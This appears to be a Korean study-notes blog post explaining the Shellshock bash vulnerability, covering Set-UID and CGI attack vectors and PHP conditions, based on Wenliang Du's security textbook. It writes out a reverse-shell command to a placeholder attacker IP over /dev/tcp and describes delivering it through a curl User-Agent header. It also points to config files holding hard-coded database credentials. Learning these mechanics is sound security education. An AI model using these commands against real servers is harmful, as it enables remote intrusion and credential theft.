---
title: Shellshock Attack
tags: security shellshock
key: page-shellshock_attack
cover: /assets/cover/cyber_security.png
mathjax: true
mathjax_autoNumber: true
---

## Shell이란?
* Shell이란 command-line interpreter이다. 유저와 OS사이에서 명령어들을 읽고 그것들을 실행시켜준다.
* sh, bash, csh, zsh, Windows PowerShell 등이 있다.
* 그 중 bash shell이 Linux계열에서 가장 많이 쓰인다.
* Shell 안에 존재하는 보안 취약점들을 ShellShock라고 부른다.

```shell
$ foo=' () { echo "hello world"; }'
$ echo $foo
() { echo "hello world"; }
$ declare -f foo
$ export foo
$ bash
(child):$ echo $foo

(child):$ declare -f foo
foo ()
{
    echo "hello world"
}
(child) :$ foo
hello world
```

* 여기서 foo= ' '를 해버리면 shell variable로 인식을 해버리지만 자식 bash에서는 shell function으로 작동되어 버린다.
* 그리고 { 왼쪽 오른쪽에 스페이스(```() { echo```)가 반드시 있어야지만 함수로 인식 할 수 있다.
* export 커맨드를 통해 입력된 쉘 변수는 자식 쉘에게 전달될 수 있다.
* 부모 shell에서 자식 shell로 환경변수를 전달하는 과정에서 ()이 있으면 자식 shell에게 쉘 변수가 아닌 쉘 함수로 전달한다.
* declare는 쉘 함수를 프린트 해준다.

## The Shellshock Bug

* Shellsock가 일어나는 이유는 bash 코드 안에서 parsing을 제대로 못하고 있기 때문이었다.
* 먼저 환견변수들 중에서 ```() {``` 로 시작하면 환경변수를 함수로 바꿔버린다.
```
foo='() { echo "test"; } -> foo () { echo "test"; }
```
* 환경 변수로 바꾸면서 만약 거기에 함수 정의만 있는 것이 아니라 커맨드가 있다면 그것마저 실행시켜버려서 여기서 버그가 발생하게 된 것이다.

## Shellshock Attack on Set-UID Programs

* bash shell을 호출하는 함수가 있는 프로그램이 있다면 그게 타겟 프로그램이 될 수 있다.
* 타겟 프로그램이 Set-UID Program일때 우리는 위의 버그 예제를 사용함으로써 root shell을 탈취할 수 있다.
* 이때, dash와 같은 shell이 realID와 eID가 다름으로써 환경 변수로부터 함수 변환이 안 되는 것을 방지 하지 않는 취약한 프로그램으로만 공격이 가능할 것이다.

## Shellshock Attack on CGI Programs

* Common Gateway Interface(CGI)는 웹 서버에서 다이나믹하게 웹 페이지를 생성해주는 프로그램을 돌릴 수 있게 도와주는 것이다.
* 많은 CGI가 shell script를 쓰는데 bash를 쓰는게 있다면 우리가 노리는 타겟이 된다.
* 서버쪽에서 cgi 프로그램이 아파치 서버에 요청을 하면 서버는 fork를 통해 새로운 프로세스를 실행하게 된다.
* #!/bin/bash로 시작하면 exec()가 /bin/bash를 실행하게 된다.
* 브라우저로 user-agent값을 바꿔서 보내는건 힘들기 때문에 curl로 -A 를 통해 shellshock를 일으키는게 좋고 우분투 시스템에서 대게 일반적으로 /var/www/SQL/collabtive/config/standard/config.php나 /var/www/SeedElgg/engine/settings.php 문서들을 보면 데이터베이스 아이디와 비번이 hard coding된 것을 볼 수 있다.

## Reverse Shell

* Reverse Shell이란 원격 컴퓨터에서 input output을 컨트롤 할 수 있게 해주는 shell process이다.
* netcat을 주로 쓰는데 ```$ nc -l 9090 -v```라는 명령어를 주면 9090번 포트에서 listen을 하고 있고 공격자 컴퓨터에서 이것을 먼저 실행시킨다.
* 이후 서버쪽에서 ```$ /bin/bash -i > /dev/tcp/<attacker ip>/9090 0<&1 2>&1```을 실행시켜준다.
* bash를 interactive하게 쓴다는 거고 거기의 stdout을 9090포트로 보내는데 stdout내용을 fd 0(stdin) 으로 사용하고 stderr는 stdout(fd 1)로 보내겠다는 의미이다.
* 서버에 보내는 명령어를 이전에 배운 shellshock를 통해 실행시키면 되는데 curl -A에 넣어서 보내면 된다.
* Reverse shell에서 중요한 것은 standard input, output, and error에 관한 값을 공격자의 network connection으로 redirect하는 것이다. 


## Remote Attack on PHP

* Shellshock 공격에는 다음 2가지 조건이 필요하다.
    1. invocation of bash
    1. passing of user data as environment variables
* PHP code에서 system()을 쓰고, shell 이 bash라면 1번 조건이 충족된다.
* system()을 통해서 environment variables을 user input에 의해 설정할 수 있다면 2번 조건이 충족된다.

## Refrence

* [COMPUTER SECURITY: A Hands-on Approach by Wenliang Du](https://www.amazon.com/Computer-Security-Hands-Approach-Wenliang/dp/154836794X)